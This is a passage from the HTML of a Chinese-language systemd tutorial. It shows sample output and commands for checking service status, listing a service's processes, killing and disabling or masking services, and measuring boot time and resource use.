style="color:#999988;font-style:italic"># systemctl</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">UNIT                                             LOAD   ACTIVE SUB       DESCRIPTION</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">proc-sys-fs-binfmt_misc.automount                loaded active waiting   Arbitrary Executable File Formats File System Aut</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sys-devices-pci</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.0-backlight-acpi_video1.device loaded active plugged   /sys/devices/pci0000:00/0000:00:01.0/0000:01:00.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sys-devices-pci</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.0-backlight-acpi_video0.device loaded active plugged   /sys/devices/pci0000:00/0000:00:02.0/backlight/ac</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sys-devices-pci</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.00-0000:00:19.0-net-em1.device loaded active plugged   82579LM Gigabit Network Connection</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sys-devices-pci</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.d1.4:1.0-bluetooth-hci0.device loaded active plugged   /sys/devices/pci0000:00/0000:00:1a.0/usb1/1-1/1-1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sys-devices-pci</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.000:00:1b.0-sound-card0.device loaded active plugged   </span><span class="token number" style="color:#36acaa">6</span><span class="token plain"> Series/C200 Series Chipset Family High Definiti</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sys-devices-pci</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.0000:03:00.0-net-wlp3s0.device loaded active plugged   RTL8188CE </span><span class="token number" style="color:#36acaa">802</span><span class="token plain">.11b/g/n WiFi Adapter</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sys-devices-pci</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.-0:0:0:0-block-sda-sda1.device loaded active plugged   ST9500420AS</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sys-devices-pci</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.-0:0:0:0-block-sda-sda2.device loaded active plugged   ST9500420AS</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sys-devices-pci</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.-0:0:0:0-block-sda-sda3.device loaded active plugged   ST9500420AS</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sys-devices-pci</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.-0:0:0:0-block-sda-sda5.device loaded active plugged   ST9500420AS</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sys-devices-pci</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.-0:0:0:0-block-sda-sda6.device loaded active plugged   ST9500420AS</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sys-devices-pci</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.-0:0:0:0-block-sda-sda7.device loaded active plugged   LVM PV EKHM59-PY9G-AoRX-Nr9k-nnxN-XxxO-DFcj4N on</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sys-devices-pci</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.0:0:0-0:0:0:0-block-sda.device loaded active plugged   ST9500420AS</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sys-devices-pci</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.-1:0:0:0-block-sdb-sdb1.device loaded active plugged   KINGSTON_SVP200S360G</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sys-devices-pci</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.-1:0:0:0-block-sdb-sdb2.device loaded active plugged   LVM PV rlRqSb-IlQn-DJQi-i7fg-sUV5-3bjI-g2npg7 on</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sys-devices-pci</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.1:0:0-1:0:0:0-block-sdb.device loaded active plugged   KINGSTON_SVP200S360G</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>要检查具体的服务，则使用status选项加上服务名即可，如下：</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># systemctl status libvirtd</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">libvirtd.service - Virtualization daemon</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   Loaded: loaded </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">/usr/lib/systemd/system/libvirtd.service</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> enabled</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   Active: active </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">running</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> since 一 </span><span class="token number" style="color:#36acaa">2014</span><span class="token plain">-04-07 </span><span class="token number" style="color:#36acaa">19</span><span class="token plain">:10:30 CST</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> 9min ago</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     Docs: man:libvirtd</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">8</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           http://libvirt.org</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> Main PID: </span><span class="token number" style="color:#36acaa">1673</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">libvirtd</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   CGroup: /system.slice/libvirtd.service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           ├─1673 /usr/sbin/libvirtd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           └─1804 /sbin/dnsmasq --conf-file</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">/var/lib/libvirt/dnsmasq/default.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">4</span><span class="token plain">月 07 </span><span class="token number" style="color:#36acaa">19</span><span class="token plain">:10:33 localhost.localdomain dnsmasq</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">1804</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">: using nameserver </span><span class="token number" style="color:#36acaa">218.6</span><span class="token plain">.200.139</span><span class="token comment" style="color:#999988;font-style:italic">#53</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">4</span><span class="token plain">月 07 </span><span class="token number" style="color:#36acaa">19</span><span class="token plain">:10:33 localhost.localdomain dnsmasq</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">1804</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">: using nameserver </span><span class="token number" style="color:#36acaa">61.139</span><span class="token plain">.2.69</span><span class="token comment" style="color:#999988;font-style:italic">#53</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">4</span><span class="token plain">月 07 </span><span class="token number" style="color:#36acaa">19</span><span class="token plain">:10:33 localhost.localdomain dnsmasq</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">1804</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">: using </span><span class="token builtin class-name">local</span><span class="token plain"> addresses only </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> unqualified names</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">4</span><span class="token plain">月 07 </span><span class="token number" style="color:#36acaa">19</span><span class="token plain">:10:33 localhost.localdomain dnsmasq</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">1804</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">: </span><span class="token builtin class-name">read</span><span class="token plain"> /etc/hosts - </span><span class="token number" style="color:#36acaa">3</span><span class="token plain"> addresses</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">4</span><span class="token plain">月 07 </span><span class="token number" style="color:#36acaa">19</span><span class="token plain">:10:33 localhost.localdomain dnsmasq</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">1804</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">: </span><span class="token builtin class-name">read</span><span class="token plain"> /var/lib/libvirt/dnsmasq/default.addnhosts - </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> addresses</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">4</span><span class="token plain">月 07 </span><span class="token number" style="color:#36acaa">19</span><span class="token plain">:10:33 localhost.localdomain dnsmasq-dhcp</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">1804</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">: </span><span class="token builtin class-name">read</span><span class="token plain"> /var/lib/libvirt/dnsmasq/default.hostsfile</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hint: Some lines were ellipsized, use -l to show </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> full.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>以上这些信息向我们展示了服务的运行时间，当前状态，相关进程pid，以及最近的有关该服务的日志信息，是不是很方便？</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="2-找出每项服务所对应的进程id">2 找出每项服务所对应的进程id<a class="hash-link" href="#2-找出每项服务所对应的进程id" title="标题的直接链接">​</a></h3><p>对于系统管理来说这是最常见的工作，但是在sysvinit时代我们只能借助例如ps命令等来完成，而systemd已经考虑到了系统管理员的需求，于是下面的命令诞生了：</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># systemd-cgls</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">├─1 /usr/lib/systemd/systemd --switched-root --system --deserialize </span><span class="token number" style="color:#36acaa">22</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">├─user.slice</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│ ├─user-1000.slice</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│ │ ├─session-1.scope</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│ │ │ ├─1806 gdm-session-worker </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">pam/gdm-password</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│ │ │ ├─1820 /usr/bin/gnome-keyring-daemon --daemonize --login</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│ │ │ ├─1822 gnome-session</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│ │ │ ├─1830 dbus-launch --sh-syntax --exit-with-session</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│ │ │ ├─1831 /bin/dbus-daemon --fork --print-pid </span><span class="token number" style="color:#36acaa">4</span><span class="token plain"> --print-address </span><span class="token number" style="color:#36acaa">6</span><span class="token plain"> --session</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│ │ │ ├─1858 /usr/libexec/at-spi-bus-launcher</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│ │ │ ├─1862 /bin/dbus-daemon --config-file</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">/etc/at-spi2/accessibility.conf --nofork --print-address </span><span class="token number" style="color:#36acaa">3</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│ │ │ ├─1865 /usr/libexec/at-spi2-registryd --use-gnome-session</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│ │ │ ├─1872 /usr/libexec/gvfsd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">. </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>现在我们可以很清晰的看到哪项服务启动了哪些进程，对于系统管理来说十分有用；</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="3-如何正确的杀死服务进程">3 如何正确的杀死服务进程<a class="hash-link" href="#3-如何正确的杀死服务进程" title="标题的直接链接">​</a></h3><p>在sysvinit的时代，如果需要结束一个服务及其启动的所有进程，可能会遇到一些糟糕的进程无法正确结束掉，即便是我们使用kill，killall等命令来结束它们，到了systemd的时代一切都变得不一样，systemd号称是第一个能正确的终结一项服务的程序，下面来看看具体如何操作的：</p><p><code>systemctl kill crond.service</code></p><p>或者指定一个信号发送出去</p><p><code>systemctl kill -s SIGKILL crond.service</code></p><p>例如可以像这样执行一次reload操作</p><p><code>systemctl kill -s HUP --kill-who=main crond.service</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="4-如何停止和禁用一项服务">4 如何停止和禁用一项服务<a class="hash-link" href="#4-如何停止和禁用一项服务" title="标题的直接链接">​</a></h3><p>下面我们回顾一下在sysvinit时代执行下面的命令所实现的功能</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># service ntpd stop</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># chkconfig ntpd off</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>很简单，首先停止服务，其次禁用服务
那么在systemd中应该如何操作呢？</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># systemctl stop ntpd.service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># systemdctl disable ntpd.service</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>很显然systemctl命令已经取代了service 和chkconfig两个命令的位置，不光如此，我们还能将服务设置为连人工也无法启动：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># ln -s /dev/null  /etc/systemd/system/ntpd.service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># systemctl daemon-reload</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="5-检查系统启动消耗时间">5 检查系统启动消耗时间<a class="hash-link" href="#5-检查系统启动消耗时间" title="标题的直接链接">​</a></h3><p>在过去我们可以借助第三方工具来实现对系统启动过程的耗时跟踪，现在这个功能已经集成到systemd当中，可以十分方便的了解到系统启动时在各个阶段所花费的时间：</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># systemd-analyze</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Startup finished </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">.669s </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">kernel</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> + </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">.514s </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">initrd</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> + </span><span class="token number" style="color:#36acaa">7</span><span class="token plain">.106s </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">userspace</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">10</span><span class="token plain">.290s</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">以上信息简要的列出了从内核到用户空间整个引导过程大致花费的时间，如果要查看具体每项服务所花费的时间则使用如下命令：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># systemd-analyze blame</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          </span><span class="token number" style="color:#36acaa">6</span><span class="token plain">.468s dnf-makecache.service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          </span><span class="token number" style="color:#36acaa">5</span><span class="token plain">.556s network.service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">.022s plymouth-start.service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           812ms plymouth-quit-wait.service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           542ms lvm2-pvscan@8:7.service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           451ms systemd-udev-settle.service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           306ms firewalld.service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           246ms dmraid-activation.service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           194ms lvm2-pvscan@8:18.service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           171ms lvm2-monitor.service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           145ms bluetooth.service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           135ms accounts-daemon.service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           113ms rtkit-daemon.service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           111ms ModemManager.service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           104ms avahi-daemon.service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           102ms systemd-logind.service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            79ms systemd-vconsole-setup.service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            77ms acpid.service</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>输出结果类似上面这些内容，至此我们可以看到系统里每一项服务的启动时间，据此可以对系统引导过程了如指掌，如果你觉得这还不够直观，那么可以将结果导出到图像文件里面：</p><p><code>systemd-analyze plot &gt;systemd.svg</code></p><p>该命令会将系统的启动过程输出到一张svg图像上面，更直观的展现出各个服务启动所花费的时间，在我们需要分析和优化服务启动项的时候很有帮助。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="6-查看各项服务的资源使用情况">6 查看各项服务的资源使用情况<a class="hash-link" href="#6-查看各项服务的资源使用情况" title="标题的直接链接">​</a></h3><p>和top命令不一样，top命令更侧重于展示以进程为单位的资源状态，而systemd提供了一个命令来方便的查看每项服务的实时资源消耗状态：</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># systemd-cgtop</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Path                                              Tasks   %CPU   Memory  Input/s Output/s</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/                                                   </span><span class="token number" style="color:#36acaa">199</span><span class="token plain">   </span><span class="token number" style="color:#36acaa">12.3</span><span class="token plain">     </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">.9G        -        -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/system.slice/ModemManager.service                    </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">      -        -        -        -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/system.slice/abrt-oops.service                       </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">      -        -        -        -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/system.slice/abrt-xorg.service                       </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">      -        -        -        -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/system.slice/abrtd.service                           </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">      -        -        -        -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/system.slice/accounts-daemon.service                 </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">      -        -        -        -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/system.slice/acpid.service                           </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">      -        -        -        -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/system.slice/alsa-state.service                      </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">      -        -        -        -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/system.slice/atd.service                             </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">      -        -        -        -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/system.slice/auditd.service                          </span><span class="token number" style="color:#36acaa">3</span><span class="token plain">      -        -        -        -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/system.slice/avahi-daemon.service                    </span><span class="token number" style="color:#36acaa">2</span><span class="token plain">      -        -        -        -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/system.slice/bluetooth.service                       </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">      -        -        -        -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/system.slice/chronyd.service                         </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">      -        -        -        -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/system.slice/colord.service                          </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">      -        -        -        -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/system.slice/crond.service                           </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">      -        -        -        -</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="7-我们必须要注意到的配置文件变更">7 我们必须要注意到的配置文件变更<a class="hash-link" href="#7-我们必须要注意到的配置文件变更" title="标题的直接链接">​</a></h3><p>systemd考虑到各种发行版本的用户使用习惯，尽量提供更为通用的配置文件以方便各家统一，方便用户使用，下面列出一些基本的统一的配置文件：</p><ul><li>/etc/hostname，debian和redhat在这个配置文件上的差异导致了系统管理或多或少的不便，此文件的统一意义重大</li><li>/etc/vconsole.conf，此文件用来统一管理console和键盘映射</li><li>/etc/locale.conf 配置系统环境语系</li><li>/etc/modules-load.d/*.conf 内核模块加载配置文件</li><li>/etc/sysctl.d/*.conf 内核参数配置文件，对/etc/sysctl.conf的扩充</li><li>/etc/tmpfiles.d/*.conf 运行态临时文件配置</li><li>/etc/os-release  /etc/machine-id  /etc/machine-info 这三个文件的统一对系统管理员来说也是意义深远，它让我们有了统一的检测发行版本等信息的入口</li></ul><p>以上内容仅仅让各位对systemd形成基本的认识，我们将在后期的文章中更加深入地讨论systemd的特性。最后，再次感谢作者Lennart的贡献。</p><blockquote><p>参考链接：</p><ul><li><a href="http://cgit.freedesktop.org/systemd/" target="_blank" rel="noopener noreferrer">http://cgit.freedesktop.org/systemd/</a></li><li><a href="http://0pointer.de/blog/projects/" target="_blank" rel="noopener noreferrer">http://0pointer.de/blog/projects/</a></li><li><a href="https://linuxtoy.org/archives/interview-creater-of-systemd-and-pulseaudio-lennart.html" target="_blank" rel="noopener 